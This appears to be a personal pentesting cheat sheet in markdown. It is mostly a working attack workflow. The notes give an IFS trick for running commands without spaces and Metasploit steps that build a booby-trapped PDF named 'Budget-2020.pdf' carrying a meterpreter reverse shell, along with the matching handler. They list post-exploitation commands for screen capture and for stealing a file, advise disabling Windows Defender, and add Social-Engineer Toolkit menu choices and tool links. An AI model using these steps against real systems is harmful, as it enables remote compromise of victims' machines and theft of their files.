# Misc exploit

Command execution without space:

    IFS=_;command='ls_-l';$command

# Exploit Adobe example:

These two combinations work on Windows 10. Make sure to turn off windows defender...
`
exploit/windows/fileformat/adobe_pdf_embedded_exe with Adobe Reader 8.1.1
exploit/windows/fileformat/adobe_libtiff with Adobe Reader 8.1.1
`
Get adobe download from: ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/

Steps:

    use exploit/windows/fileformat/adobe_libtiff 
    set FILENAME Budget-2020.pdf
    set PAYlOAD windows/meterpreter/reverse_tcp
    set LHOST 172.17.0.2
    exploit 
[COPY OVER THE PDF FILE]

    use exploit/multi/handler 
	set PAYlOAD windows/meterpreter/reverse_tcp
    set LHOST 172.17.0.2
    exploit

Capture screen:

    use espia
    screengrab


Download a file:

    download secret.docx

Show processes:

	ps



# Exploit settolkit example
`
3
1
13
2
2
`

# Hashcat


# Windows things

Checked logged in users:

    qwinsta /server:1.1.1.1



# Useful tools

## XSS

https://xsshunter.com/

## SSL/TLS config guide

https://mozilla.github.io/server-side-tls/ssl-config-generator/


## GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

https://gtfobins.github.io/

# tcpdump

## DHCP

    sudo tcpdump -i any -pvn port 67 and port 68


